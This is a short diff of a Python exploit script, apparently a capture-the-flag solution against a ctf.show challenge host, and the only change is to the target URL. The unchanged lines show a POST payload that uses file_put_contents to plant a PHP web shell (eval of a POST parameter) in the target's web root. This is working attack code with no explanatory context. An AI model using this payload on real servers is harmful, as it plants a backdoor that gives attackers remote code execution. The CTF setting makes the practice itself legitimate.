@@ -2,7 +2,7 @@ import requests
 import io
 import threading
 
-url='http://c218b7f4-c631-4d4c-ba8a-0171b7dc4e15.challenge.ctf.show/:8080/'
+url='http://71566c6e-995d-40a9-bb86-2acdefc4b03c.challenge.ctf.show/:8080/'
 sessionid='ctfshow'
 data={
 	"1":"file_put_contents('/var/www/html/jiuzhen.php','<?php eval($_POST[3]);?>');"
